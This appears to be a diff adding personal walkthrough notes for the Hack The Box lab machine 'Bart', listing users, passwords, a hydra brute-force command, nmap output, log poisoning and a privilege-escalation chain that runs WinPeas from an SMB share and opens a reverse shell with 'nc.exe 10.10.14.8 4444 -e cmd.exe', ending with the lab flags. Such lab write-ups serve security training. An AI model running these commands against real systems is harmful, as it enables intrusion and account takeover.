@@ -1,0 +1,77 @@
+Difficulty : Medium
+ 
+OS: Windows
+ 
+Web Technology Used:
+Programming → PHP 
+Web Server → IIS 10.0
+ 
+IP: 10.10.10.81
+Sub Domains: forum.bart.htb monitor.bart.htb internal-01.bart.htb
+ 
+USERS:
+Samantha Brown 
+DanielSimmons
+Robert Hilton
+HarveyPotter
+ 
+CREDENTIAL:
+monitor.bart.htb→ harvey : potter
+internal-01.bart.htb→ harvey : Password1
+Brute Force Attack: hydra -l harvey -P /usr/share/wordlists/rockyou.txt -u internal-01.bart.htb http-get-form "/simple_chat/login_form.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid Username or Password" -t 64
+==============================================================
+ 
+ATTACK AND ENUM VECTORS:
+80 → HTTP →Wordpress 4.8.2
+==============================================================
+ 
+NMAP OR RUSTSCAN:
+PORT   STATE SERVICE REASON          VERSION
+80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-favicon: Unknown favicon MD5: 50465238F8A85D0732CBCC8EB04920AA
+|_http-title: Did not follow redirect to http://forum.bart.htb/
+ 
+ 
+NIKTO / CMS /WEB RESULTS:
+ 
+[+] NIKTO:
+ 
+[+] WFUZZ:
+ 
+[+] FILES:
+ 
+[+] DIRECTORIES:
+ 
+==============================================================
+ 
+Vulnerabilities: User Agent → Log Poisoning
+
+=============================================================================
+Get A Shell : Using Powershell 
+
+
+
+
+
+==============================================================
+ 
+PRIV-ESC:
+Run the WinPeas.exe
+# impacket-smbserver vikas `pwd`
+PS :> & '\\10.10.14.8\vikas\winPeas.exe' 
+Administrator : 3130438f31186fbaf962f407711faddb
+$cred = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential ("local\Administrator", $cred)
+Invoke-Command -ComputerName localhost -ScriptBlock {whoami} -Credential $credential
+Invoke-Command -ComputerName localhost -ScriptBlock {& '\\10.10.14.8\vikas\reverse.exe'} -Credential $credential
+Copy-Item “\\10.10.14.8\vikas\reverse.exe" -Destination reverse.exe
+Invoke-Command -ComputerName localhost -ScriptBlock {Start-Process 'C:\Users\Public\tmp\reverse.exe} -Credential $credential
+
+Invoke-Command -ComputerName localhost -ScriptBlock {& '\\10.10.14.8\vikas\nc.exe' 10.10.14.8 4444 -e cmd.exe} -Credential $credential
+After that we got a admin shell
+user.txt → 4392158588592ec9015894aac64bcbbb
+root.txt → e77b7044b2727eadf248c3ef855adef4
